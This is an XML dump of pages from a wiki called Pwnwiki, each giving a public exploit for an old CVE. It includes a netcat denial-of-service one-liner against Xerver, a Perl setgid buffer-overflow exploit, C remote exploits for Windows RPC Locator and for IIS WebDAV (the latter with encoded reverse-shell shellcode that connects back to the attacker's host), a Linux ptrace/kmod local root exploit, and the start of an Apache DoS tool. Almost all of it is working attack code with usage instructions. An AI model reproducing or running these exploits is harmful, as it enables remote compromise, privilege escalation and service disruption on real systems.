      <text bytes="756" sha1="pnu279npw7prp2kjfg30dvm42se2joy" xml:space="preserve">==INFO==
&lt;pre&gt;
source: http://www.securityfocus.com/bid/4254/info

Xerver is a freely available webserver, written in Java. It will run on any operating system with Java installed, including Microsoft Windows, Unix/Linux variants, MacOS, etc.

It has been reported that sending an excessive number of requests for 'C:\' to port 32123 will cause the webserver to crash, denying service to legitimate users. This appears to be the case even on non-Windows based operating systems running the vulnerable software.

The webserver will need to be restarted to regain normal functionality.

This issue was reported for v2.10 of Xerver. Earlier versions may also be affected.


printf "GET /`perl -e 'print "C:/"x500000'`\r\n\r\n" |nc -vvn 127.0.0.1 32123 
&lt;/pre&gt;</text>
      <sha1>pnu279npw7prp2kjfg30dvm42se2joy</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0740 setuid/setgid緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>590</id>
    <revision>
      <id>804</id>
      <timestamp>2021-03-31T07:21:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/bin/sh echo DEFANGED.5 exit #!/usr/bin/perl # # Credits for the vulnerability: Alex Hernandez (its setgid news not root) # The exploit was written by:    zill..."</comment>
      <origin>804</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="838" sha1="la100q548cbhrsloppoft38k3sfczgl" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/bin/sh
echo DEFANGED.5
exit
#!/usr/bin/perl
#
# Credits for the vulnerability: Alex Hernandez (its setgid news not root)
# The exploit was written by:    zillion@snosoft.com / safemode.org
# http://www.safemode.org 
# http://www.snosoft.com
#
# Gain setgid news on a Red Hat 6.2 Intel box

$shellcode = 
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46".
        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1".
        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

$offset  = "-500"; 
$esp     = 0xbfffe2cc;

for ($i = 0; $i &lt; (2041 - (length($shellcode)) - 4); $i++) {
    $buffer .= "\x90";
}

$buffer .= $shellcode;
$buffer .= pack('l', ($esp + $offset)); 

print("The new return address: 0x", sprintf('%lx',($esp + $offset)), "\n");

exec("/usr/bin/slrnpull -d '$buffer'");

&lt;/pre&gt;</text>
      <sha1>la100q548cbhrsloppoft38k3sfczgl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0003 Microsoft Windows 2000/NT 4 - RPC Locator Service 遠程溢出漏洞</title>
    <ns>0</ns>
    <id>1658</id>
    <revision>
      <id>2062</id>
      <timestamp>2021-05-03T12:28:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /**************************************************************************** rpcexp.c RPC LOCATOR Exploit Autor: Marcin Wolak mail: mwolak11@wp.pl Last update:..."</comment>
      <origin>2062</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7766" sha1="4qzk7fkw11eldl6udtns97ezpmp3etj" xml:space="preserve">==EXP==
&lt;pre&gt;
/****************************************************************************
rpcexp.c
RPC LOCATOR Exploit
Autor: Marcin Wolak
mail: mwolak11@wp.pl
Last update: 30 march 2003
****************************************************************************/

/*****************************************************************************
About Compilation:
What You need to compile rpcexp.c ?
1. MS Platform SDK (August SDK is sufficient).
2. Compilator (f.e. MS Visual C++ 6.0).
rpcns4.lib is needed for linking.
*****************************************************************************/

/*****************************************************************************
Usage (You want to exploit remote Windows 2000 system (w2khost) with running RPC
Locator Service):
1. Set registry values in Your workstation as below:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\NameService\NetworkAddress = w2khost
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\NameService\ServerNetworkAddress = w2khost
2. Establish null session:
net use \\w2khost\ipc$ ""/u: ""
3. Run Exploit:
rpcexp.exe /os w2ksp3

If everything it's ok, rpcexp hangs in console window. You can go to second
cmd console, run telnet (on port 5151) and get cmd on w2khost - just run
on second console:

telnet w2khost 5151

WARNNING !
With this shellcode You can get remote cmd only once. Second attempt will
be rejected.

WARNNING !!
Currently only Windows 2000 Sp3 and Windows NT 4 Sp6a are exploitable with
rpcexp.

*****************************************************************************/

#define UNICODE
#define RPC_UNICODE_SUPPORTED

#define NT4SP6ABRD 0x42
#define W2KSP3BRD 0x142

#define NT4SP6AJMP 0x0147FBC4
#define W2KSP3JMP 0x0090F8F0

#define NT4SP6ALLA 0x77F137BD
#define NT4SP6AGPA 0x77F13FB3

#include &lt;stdio.h&gt;
#include &lt;rpc.h&gt;
#include &lt;rpcnsi.h&gt;


#define PURPOSE \
"RPC Locator exploit utility \n\
Autor: Marcin Wolak - march 2003 \n\
mail: mwolak@gazeta.pl \n\n\
Tested on:\n\n\
Windows 2000 SP3 \n\
Windows NT 4.0 SP6a \n\n\
Only for educational purposes !!!.\n\n\
Usage:\n\
rpcexp.exe /v  - to view rpcexp info.\n\
rpcexp.exe /os w2ksp3 - to exploit Windows 2000 Sp3.\n\
rpcexp.exe /os ntsp6a - to exploit Windows NT 4 Sp6a.\n"


char shellcode [] =
"\xEB\x13\x5F\xB9\xCF\x02\xCF\x02\xC1\xE9\x10\x57\x80\x37\x99\x47\xE2\xFA\x5F\xEB"
"\x05\xE8\xE8\xFF\xFF\xFF\x14\x2E\x42\x98\x99\x99\x14\x06\x59\x9B\x99\x99\xCF\x66"
"\x8A\xCE\x14\x06\x5D\x9B\x99\x99\x14\x26\x54\x9B\x99\x99\x10\x5B\x65\xA8\x50\x28"
"\x94\xD0\xA9\x59\x35\x1D\x59\xEC\x60\xCA\xCB\xC8\xCF\xCB\x66\x8A\x32\xC0\xC3\xC2"
"\x7B\x75\xC2\xCA\x14\x02\x59\x9B\x99\x99\xA9\x59\x35\x1D\x59\xEC\x60\xCF\x66\x8A"
"\x10\x5B\xC2\xCA\x14\x02\x5D\x9B\x99\x99\x65\xA8\x50\x28\x9E\xA9\x59\x35\x1D\x59"
"\xEC\x60\xCA\xCB\xC8\xCF\xCB\x66\x8A\x32\xC0\xC3\xC2\x7B\x75\xA8\x59\x2D\x9D\xC9"
"\x58\x71\x9D\xC9\x66\xCE\x55\x10\x5B\xC2\xCA\x14\x02\x25\x99\x99\x99\xA8\x50\x18"
"\x58\xC4\x9B\x99\x99\xC9\x13\x8A\x11\x89\xDA\xD9\x7B\x61\xC1\x14\x02\x15\x99\x99"
"\x99\xCA\xF1\x99\x99\x99\x99\xC9\xC9\xF1\x99\x99\x99\x99\xF1\x99\x99\x99\x99\x66"
"\xCE\x21\xC9\xF1\x99\x89\x99\x99\x66\xCE\x41\xC1\x72\x6D\x70\x9E\x9B\x99\x99\xC6"
"\xCE\x18\x5E\xD5\x99\x99\x99\x10\x67\x18\x5F\x16\x66\x66\x66\xC2\x18\x5A\x39\x99"
"\x99\x99\xCA\xF1\x9B\x9B\x99\x99\x66\xCE\x7D\xA8\x59\xC9\xD9\xC9\xD9\xC9\x66\xCE"
"\x71\x0A\xF1\x89\x99\x99\x99\xCF\xCA\x66\xCE\x75\xF1\x9B\x99\x99\x99\xCA\x66\xCE"
"\x69\xA8\x59\xCE\xC9\x29\x95\x32\xC1\x32\xD9\x32\xC6\xD1\xC9\xCE\xCF\x34\xCF\x66"
"\xCE\x25\xD1\xC9\xCE\x34\xCF\x34\xCF\x66\xCE\x25\xD1\x29\xDD\x10\x9E\xCE\x66\xCE"
"\x59\xA8\x59\x12\xDF\x6D\x10\xDE\xA5\x10\xDE\xD9\x12\x9F\x10\xDE\xA1\xA8\x59\xFF"
"\x21\x98\x98\x10\xDE\xB5\xCE\xCE\xA8\x59\xC9\xC9\xC9\xD9\xC9\xD1\xC9\xC9\x34\xCF"
"\xA8\x59\xC9\x66\xCE\x5D\x66\xEF\x69\x66\xCE\x79\x66\xEF\x65\x66\xCE\x79\xD1\xC9"
"\xC9\xCA\x66\xCE\x6D\x10\x5A\xA8\x59\x2D\x9D\xC9\x58\x71\x9D\xC9\x66\xCE\x55\x10"
"\x5F\xA8\x59\x10\x58\x2C\x9D\xC9\xC9\xCE\xC8\xCF\x66\xEE\x0A\x66\xCE\x51\x18\xA6"
"\x98\x99\x99\x99\xE5\xBC\xA8\x59\xC9\xCE\x66\xAE\xCF\x66\xEE\x0A\x66\xCE\x4D\x90"
"\x59\xED\x8D\xA8\x59\xC9\x66\xAE\xCF\xCA\x66\xCE\x61\xF1\xC9\x99\x99\x99\x66\xCE"
"\x41\x72\x5B\xA8\x59\xC9\x2D\x9D\xC9\xCF\xCA\x66\xCE\x65\xCE\xA8\x50\xC8\xC9\xCF"
"\x66\xEE\x0E\x66\xCE\x49\xF1\xC9\x99\x99\x99\x66\xCE\x41\x72\x38\xC9\x66\xCE\x45"
"\x09\xD2\xDC\xCB\xD7\xDC\xD5\xAA\xAB\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD"
"\x99\xDA\xEB\xFC\xF8\xED\xFC\xCD\xF1\xEB\xFC\xF8\xFD\x99\xDA\xEB\xFC\xF8\xED\xFC"
"\xC9\xF0\xE9\xFC\x99\xDE\xFC\xED\xCA\xED\xF8\xEB\xED\xEC\xE9\xD0\xF7\xFF\xF6\xD8"
"\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xC9\xFC\xFC\xF2"
"\xD7\xF8\xF4\xFC\xFD\xC9\xF0\xE9\xFC\x99\xDE\xF5\xF6\xFB\xF8\xF5\xD8\xF5\xF5\xF6"
"\xFA\x99\xCE\xEB\xF0\xED\xFC\xDF\xF0\xF5\xFC\x99\xCB\xFC\xF8\xFD\xDF\xF0\xF5\xFC"
"\x99\xCA\xF5\xFC\xFC\xE9\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xDA"
"\xF5\xF6\xEA\xFC\xD1\xF8\xF7\xFD\xF5\xFC\x99\xCE\xCA\xD6\xDA\xD2\xAA\xAB\x99\xCE"
"\xCA\xD8\xCA\xED\xF8\xEB\xED\xEC\xE9\x99\xEA\xF6\xFA\xF2\xFC\xED\x99\xFB\xF0\xF7"
"\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED\x99\xEA\xFC\xF7\xFD"
"\x99\xEB\xFC\xFA\xEF\x99\x9B\x99\x8D\x86\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\xFA\xF4\xFD\xB7\xFC\xE1\xFC\x99\xFD\x06\x71\xEE\x81\x02\x71\xEE\x71\x6D"
"\x64\x66\x66\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99";

void Usage(char * pszProgramName)
{
    fprintf(stderr, "%s", PURPOSE);
    exit(1);
}

void _CRTAPI1 main(int argc, char **argv)
{
	unsigned short mytab[2000];				// Exploit Buffer
    unsigned char * TmpEntryName  = NULL;		// Temporary Entry.
	unsigned long * EntryName  = NULL;
	unsigned long * TmpPtr  = NULL;
    unsigned short * pszStrBinding = NULL;
    RPC_NS_HANDLE hnsHandle;
    unsigned long NsSntxType = RPC_C_NS_SYNTAX_DEFAULT;
    RPC_STATUS status;
    short fSuccess = 0;
    short fContinue = 1;
    unsigned long i,k;

	unsigned long * PtrLLA = (unsigned long*) &amp;shellcode[730];
	unsigned long * PtrGPA = (unsigned long*) &amp;shellcode[734];
	unsigned long JMP = W2KSP3JMP;
	unsigned long BORDER = W2KSP3BRD;

	switch(argc){
		case 2:
			if((strlen(argv[1]) == 2) &amp;&amp; (!strcmp(argv[1],"/v")))
				Usage(argv[0]);
			else
				printf("Bad arguments !!!\n");
			exit(2);
		case 3:
			if((strlen(argv[1]) == 3) &amp;&amp; (strlen(argv[2]) == 6) &amp;&amp;
			   (!strcmp(argv[1],"/os")) &amp;&amp; (!strcmp(argv[2],"w2ksp3")))
			   break;
			if((strlen(argv[1]) == 3) &amp;&amp; (strlen(argv[2]) == 6) &amp;&amp;
			   (!strcmp(argv[1],"/os")) &amp;&amp; (!strcmp(argv[2],"ntsp6a")))
			{
				(*PtrLLA) = NT4SP6ALLA ^ 0x99999999;
				(*PtrGPA) = NT4SP6AGPA ^ 0x99999999;
				JMP = NT4SP6AJMP;
				BORDER = NT4SP6ABRD;
			    break;
			}
		default:
			Usage(argv[0]);

	}

	EntryName = (unsigned long *) mytab;
	TmpEntryName = (unsigned char *) mytab;
	TmpEntryName[0] = '/';
	TmpEntryName[1] = 0;
	TmpEntryName[2] = '.';
	TmpEntryName[3] = 0;
	TmpEntryName[4] = ':';
	TmpEntryName[5] = 0;
	TmpEntryName[6] = '/';
	TmpEntryName[7] = 0;
	for (i=2;i&lt;768;i++)
	{
		if(i &lt;= BORDER)
			EntryName[i] = JMP;
		if(i == BORDER)
		{
			TmpPtr = (unsigned long*) shellcode;
			for(k = 0;k &lt; 190;k++)
				EntryName[i+k] = TmpPtr[k];
			i += 189;
		}
		if(i &gt; BORDER)
			EntryName[i] = JMP;
	}
	EntryName[768] = 0;

	  RpcTryExcept {
		  status = RpcNsBindingLookupBegin(NsSntxType,
                                         (unsigned short *) EntryName,
                                         0,
                                         NULL,
							0,
							&amp;hnsHandle);
		  printf("RpcNsBindingLookupBegin returned 0x%x\n", status);
	  }
	  RpcExcept(1){
		  printf("RPC Runtime raised exception 0x%x\n", RpcExceptionCode());
	  }
	  RpcEndExcept
} /*End of Main*/

// milw0rm.com [2003-04-03]
            
&lt;/pre&gt;</text>
      <sha1>4qzk7fkw11eldl6udtns97ezpmp3etj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0109 Microsoft IIS - WebDAV 'ntdll.dll' 遠程緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1653</id>
    <revision>
      <id>2057</id>
      <timestamp>2021-05-03T12:22:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*******************************************************************/ /* [Crpt] ntdll.dll exploit trough WebDAV by kralor [Crpt] */ /* --------------------------..."</comment>
      <origin>2057</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7076" sha1="pwb65a5qii44tu56vzyrdlwpvkx8e00" xml:space="preserve">==EXP==
&lt;pre&gt;
/*******************************************************************/
/* [Crpt] ntdll.dll exploit trough WebDAV by kralor [Crpt] */
/* --------------------------------------------------------------- */
/* this is the exploit for ntdll.dll through WebDAV. */
/* run a netcat ex: nc -L -vv -p 666 */
/* wb server.com your_ip 666 0 */
/* the shellcode is a reverse remote shell */
/* you need to pad a bit.. the best way I think is launching */
/* the exploit with pad = 0 and after that, the server will be */
/* down for a couple of seconds, now retry with pad at 1 */
/* and so on..pad 2.. pad 3.. if you haven't the shell after */
/* something like pad at 10 I think you better to restart from */
/* pad at 0. On my local IIS the pad was at 1 (0x00110011) but */
/* on all the others servers it was at 2,3,4, etc..sometimes */
/* you can have the force with you, and get the shell in 1 try */
/* sometimes you need to pad more than 10 times ;) */
/* the shellcode was coded by myself, it is SEH + ScanMem to */
/* find the famous offsets (GetProcAddress).. */
/* */
/*******************************************************************/


#include &lt;winsock.h&gt;
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#pragma comment (lib,"ws2_32")

char shellc0de[] =
"\x55\x8b\xec\x33\xc9\x53\x56\x57\x8d\x7d\xa2\xb1\x25\xb8\xcc\xcc"
"\xcc\xcc\xf3\xab\xeb\x09\xeb\x0c\x58\x5b\x59\x5a\x5c\x5d\xc3\xe8"
"\xf2\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66\xb9\xb5\x01\x80\x33"
"\x95\x43\xe2\xfa\x66\x83\xeb\x67\xfc\x8b\xcb\x8b\xf3\x66\x83\xc6"
"\x46\xad\x56\x40\x74\x16\x55\xe8\x13\x00\x00\x00\x8b\x64\x24\x08"
"\x64\x8f\x05\x00\x00\x00\x00\x58\x5d\x5e\xeb\xe5\x58\xeb\xb9\x64"
"\xff\x35\x00\x00\x00\x00\x64\x89\x25\x00\x00\x00\x00\x48\x66\x81"
"\x38\x4d\x5a\x75\xdb\x64\x8f\x05\x00\x00\x00\x00\x5d\x5e\x8b\xe8"
"\x03\x40\x3c\x8b\x78\x78\x03\xfd\x8b\x77\x20\x03\xf5\x33\xd2\x8b"
"\x06\x03\xc5\x81\x38\x47\x65\x74\x50\x75\x25\x81\x78\x04\x72\x6f"
"\x63\x41\x75\x1c\x81\x78\x08\x64\x64\x72\x65\x75\x13\x8b\x47\x24"
"\x03\xc5\x0f\xb7\x1c\x50\x8b\x47\x1c\x03\xc5\x8b\x1c\x98\x03\xdd"
"\x83\xc6\x04\x42\x3b\x57\x18\x75\xc6\x8b\xf1\x56\x55\xff\xd3\x83"
"\xc6\x0f\x89\x44\x24\x20\x56\x55\xff\xd3\x8b\xec\x81\xec\x94\x00"
"\x00\x00\x83\xc6\x0d\x56\xff\xd0\x89\x85\x7c\xff\xff\xff\x89\x9d"
"\x78\xff\xff\xff\x83\xc6\x0b\x56\x50\xff\xd3\x33\xc9\x51\x51\x51"
"\x51\x41\x51\x41\x51\xff\xd0\x89\x85\x94\x00\x00\x00\x8b\x85\x7c"
"\xff\xff\xff\x83\xc6\x0b\x56\x50\xff\xd3\x83\xc6\x08\x6a\x10\x56"
"\x8b\x8d\x94\x00\x00\x00\x51\xff\xd0\x33\xdb\xc7\x45\x8c\x44\x00"
"\x00\x00\x89\x5d\x90\x89\x5d\x94\x89\x5d\x98\x89\x5d\x9c\x89\x5d"
"\xa0\x89\x5d\xa4\x89\x5d\xa8\xc7\x45\xb8\x01\x01\x00\x00\x89\x5d"
"\xbc\x89\x5d\xc0\x8b\x9d\x94\x00\x00\x00\x89\x5d\xc4\x89\x5d\xc8"
"\x89\x5d\xcc\x8d\x45\xd0\x50\x8d\x4d\x8c\x51\x6a\x00\x6a\x00\x6a"
"\x00\x6a\x01\x6a\x00\x6a\x00\x83\xc6\x09\x56\x6a\x00\x8b\x45\x20"
"\xff\xd0"
"CreateProcessA\x00LoadLibraryA\x00ws2_32.dll\x00WSASocketA\x00"
"connect\x00\x02\x00\x02\x9A\xC0\xA8\x01\x01\x00"
"cmd" // don't change anything..
"\x00\x00\xe7\x77" // offsets of kernel32.dll for some win ver..
"\x00\x00\xe8\x77"
"\x00\x00\xf0\x77"
"\x00\x00\xe4\x77"
"\x00\x88\x3e\x04" // win2k3
"\x00\x00\xf7\xbf" // win9x =P
"\xff\xff\xff\xff";

int test_host(char *host)
{
char search[100]="";
int sock;
struct hostent *heh;
struct sockaddr_in hmm;
char buf[100] ="";

if(strlen(host)&gt;60) {
printf("error: victim host too long.\r\n");
return 1;
}

if ((heh = gethostbyname(host))==0){
printf("error: can't resolve '%s'",host);
return 1;
}

sprintf(search,"SEARCH / HTTP/1.1\r\nHost: %s\r\n\r\n",host);
hmm.sin_port = htons(80);
hmm.sin_family = AF_INET;
hmm.sin_addr = *((struct in_addr *)heh-&gt;h_addr);

if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){
printf("error: can't create socket");
return 1;
}

printf("Checking WebDav on '%s' ... ",host);

if ((connect(sock, (struct sockaddr *) &amp;hmm, sizeof(hmm))) == -1){
printf("CONNECTING_ERROR\r\n");
return 1;
}
send(sock,search,strlen(search),0);
recv(sock,buf,sizeof(buf),0);
if(buf[9]=='4'&amp;&amp;buf[10]=='1'&amp;&amp;buf[11]=='1')
return 0;
printf("NOT FOUND\r\n");
return 1;
}

void help(char *program)
{
printf("syntax: %s &lt;victim_host&gt; &lt;your_host&gt; &lt;your_port&gt; [padding]\r\n",program);
return;
}

void banner(void)
{
printf("\r\n\t [Crpt] ntdll.dll exploit trough WebDAV by kralor
[Crpt]\r\n");
printf("\t\twww.coromputer.net &amp;&amp; undernet #coromputer\r\n\r\n");
return;
}

void main(int argc, char *argv[])
{
WSADATA wsaData;
unsigned short port=0;
char *port_to_shell="", *ip1="", data[50]="";
unsigned int i,j;
unsigned int ip = 0 ;
int s, PAD=0x10;
struct hostent *he;
struct sockaddr_in crpt;
char buffer[65536] ="";
char request[80000]; // huuuh, what a mess! :)
char content[] =
"&lt;?xml version=\"1.0\"?&gt;\r\n"
"&lt;g:searchrequest xmlns:g=\"DAV:\"&gt;\r\n"
"&lt;g:sql&gt;\r\n"
"Select \"DAV:displayname\" from scope()\r\n"
"&lt;/g:sql&gt;\r\n"
"&lt;/g:searchrequest&gt;\r\n";

banner();
if((argc&lt;4)||(argc&gt;5)) {
help(argv[0]);
return;
}

if(WSAStartup(0x0101,&amp;wsaData)!=0) {
printf("error starting winsock..");
return;
}

if(test_host(argv[1]))
return;

if(argc==5)
PAD+=atoi(argv[4]);

printf("FOUND\r\nexploiting ntdll.dll through WebDav [ret: 0x00%02x00%02x]\r\n",PAD,PAD);

ip = inet_addr(argv[2]); ip1 = (char*)&amp;ip;

shellc0de[448]=ip1[0]; shellc0de[449]=ip1[1]; shellc0de[450]=ip1[2];
shellc0de[451]=ip1[3];

port = htons(atoi(argv[3]));
port_to_shell = (char *) &amp;port;
shellc0de[446]=port_to_shell[0];
shellc0de[447]=port_to_shell[1];

// we xor the shellcode [xored by 0x95 to avoid bad chars]
__asm {
lea eax, shellc0de
add eax, 0x34
xor ecx, ecx
mov cx, 0x1b0
wah:
xor byte ptr[eax], 0x95
inc eax
loop wah
}

if ((he = gethostbyname(argv[1]))==0){
printf("error: can't resolve '%s'",argv[1]);
return;
}

crpt.sin_port = htons(80);
crpt.sin_family = AF_INET;
crpt.sin_addr = *((struct in_addr *)he-&gt;h_addr);

if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
printf("error: can't create socket");
return;
}

printf("Connecting... ");

if ((connect(s, (struct sockaddr *) &amp;crpt, sizeof(crpt))) == -1){
printf("ERROR\r\n");
return;
}
// No Operation.
for(i=0;i&lt;sizeof(buffer);buffer[i]=(char)0x90,i++);
// fill the buffer with the shellcode
for(i=64000,j=0;i&lt;sizeof(buffer)&amp;&amp;j&lt;sizeof(shellc0de)-1;buffer[i]=shellc0de[j],i++,j++);
// well..it is not necessary..
for(i=0;i&lt;2500;buffer[i]=PAD,i++);

/* we can simply put our ret in this 2 offsets.. */
//buffer[2086]=PAD;
//buffer[2085]=PAD;

buffer[sizeof(buffer)]=0x00;
memset(request,0,sizeof(request));
memset(data,0,sizeof(data));
sprintf(request,"SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nContent-Length: ",buffer,argv[1]);
sprintf(request,"%s%d\r\n\r\n",request,strlen(content));
printf("CONNECTED\r\nSending evil request... ");
send(s,request,strlen(request),0);
send(s,content,strlen(content),0);
printf("SENT\r\n");
recv(s,data,sizeof(data),0);
if(data[0]!=0x00) {
printf("Server seems to be patched.\r\n");
printf("data: %s\r\n",data);
} else
printf("Now if you are lucky you will get a shell.\r\n");
closesocket(s);
return;
}

// milw0rm.com [2003-03-23]
            
&lt;/pre&gt;</text>
      <sha1>pwb65a5qii44tu56vzyrdlwpvkx8e00</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0127 Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' 權限提升漏洞</title>
    <ns>0</ns>
    <id>1660</id>
    <revision>
      <id>2064</id>
      <timestamp>2021-05-03T12:29:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*  * Linux kernel ptrace/kmod local root exploit  *  * This code exploits a race condition in kernel/kmod.c, which creates  * kernel thread in insecure manner...."</comment>
      <origin>2064</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3798" sha1="fd0iwv8n5c7kx8am7xn3z56oapv4twx" xml:space="preserve">==EXP==
&lt;pre&gt;
/*
 * Linux kernel ptrace/kmod local root exploit
 *
 * This code exploits a race condition in kernel/kmod.c, which creates
 * kernel thread in insecure manner. This bug allows to ptrace cloned
 * process, allowing to take control over privileged modprobe binary.
 *
 * Should work under all current 2.2.x and 2.4.x kernels.
 * 
 * I discovered this stupid bug independently on January 25, 2003, that
 * is (almost) two month before it was fixed and published by Red Hat
 * and others.
 * 
 * Wojciech Purczynski &lt;cliph@isec.pl&gt;
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
 * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
 * 
 * (c) 2003 Copyright by iSEC Security Research
 */

#include &lt;grp.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;paths.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/user.h&gt;

char cliphcode[] =
	"\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
	"\x00\x5b\x31\xc9\x89\xca\xcd\x80"
	"\xb8\x0f\x00\x00\x00\xb9\xed\x0d"
	"\x00\x00\xcd\x80\x89\xd0\x89\xd3"
	"\x40\xcd\x80\xe8\xdc\xff\xff\xff";

#define CODE_SIZE (sizeof(cliphcode) - 1)

pid_t parent = 1;
pid_t child = 1;
pid_t victim = 1;
volatile int gotchild = 0;

void fatal(char * msg)
{
	perror(msg);
	kill(parent, SIGKILL);
	kill(child, SIGKILL);
	kill(victim, SIGKILL);
}

void putcode(unsigned long * dst)
{
	char buf[MAXPATHLEN + CODE_SIZE];
	unsigned long * src;
	int i, len;

	memcpy(buf, cliphcode, CODE_SIZE);
	len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);
	if (len == -1)
		fatal("[-] Unable to read /proc/self/exe");

	len += CODE_SIZE + 1;
	buf[len] = '\0';
	
	src = (unsigned long*) buf;
	for (i = 0; i &lt; len; i += 4)
		if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)
			fatal("[-] Unable to write shellcode");
}

void sigchld(int signo)
{
	struct user_regs_struct regs;

	if (gotchild++ == 0)
		return;
	
	fprintf(stderr, "[+] Signal caught\n");

	if (ptrace(PTRACE_GETREGS, victim, NULL, &amp;regs) == -1)
		fatal("[-] Unable to read registers");
	
	fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);
	
	putcode((unsigned long *)regs.eip);

	fprintf(stderr, "[+] Now wait for suid shell...\n");

	if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
		fatal("[-] Unable to detach from victim");

	exit(0);
}

void sigalrm(int signo)
{
	errno = ECANCELED;
	fatal("[-] Fatal error");
}

void do_child(void)
{
	int err;

	child = getpid();
	victim = child + 1;

	signal(SIGCHLD, sigchld);

	do
		err = ptrace(PTRACE_ATTACH, victim, 0, 0);
	while (err == -1 &amp;&amp; errno == ESRCH);

	if (err == -1)
		fatal("[-] Unable to attach");

	fprintf(stderr, "[+] Attached to %d\n", victim);
	while (!gotchild) ;
	if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)
		fatal("[-] Unable to setup syscall trace");
	fprintf(stderr, "[+] Waiting for signal\n");

	for(;;);
}

void do_parent(char * progname)
{
	struct stat st;
	int err;
	errno = 0;
	socket(AF_SECURITY, SOCK_STREAM, 1);
	do {
		err = stat(progname, &amp;st);
	} while (err == 0 &amp;&amp; (st.st_mode &amp; S_ISUID) != S_ISUID);
	
	if (err == -1)
		fatal("[-] Unable to stat myself");

	alarm(0);
	system(progname);
}

void prepare(void)
{
	if (geteuid() == 0) {
		initgroups("root", 0);
		setgid(0);
		setuid(0);
		execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
		fatal("[-] Unable to spawn shell");
	}
}

int main(int argc, char ** argv)
{
	prepare();
	signal(SIGALRM, sigalrm);
	alarm(10);
	
	parent = getpid();
	child = fork();
	victim = child + 1;
	
	if (child == -1)
		fatal("[-] Unable to fork");

	if (child == 0)
		do_child();
	else
		do_parent(argv[0]);

	return 0;
}

// milw0rm.com [2003-03-30]
            
&lt;/pre&gt;</text>
      <sha1>fd0iwv8n5c7kx8am7xn3z56oapv4twx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0132 Apache 2.0.44 (Linux) 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>1654</id>
    <revision>
      <id>2058</id>
      <timestamp>2021-05-03T12:23:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /******** th-apachedos.c ******************************************************** * * * Remote Apache DoS exploit * * ------------------------- * * Written as a..."</comment>
      <origin>2058</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2238" sha1="tv8y4h6fievqg2e53w8joyfydyxyj0w" xml:space="preserve">==EXP==
&lt;pre&gt;
/******** th-apachedos.c ********************************************************
* *
* Remote Apache DoS exploit *
* ------------------------- *
* Written as a poc for the: *
* 
* This program sends 8000000 \n's to exploit the Apache memory leak. *
* Works from scratch under Linux, as opposed to apache-massacre.c . *
* 
* 
* Daniel Nyström &lt;exce@netwinder.nu&gt; *
* 
* - www.telhack.tk - *
* 
******************************************************** th-apachedos.c ********/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
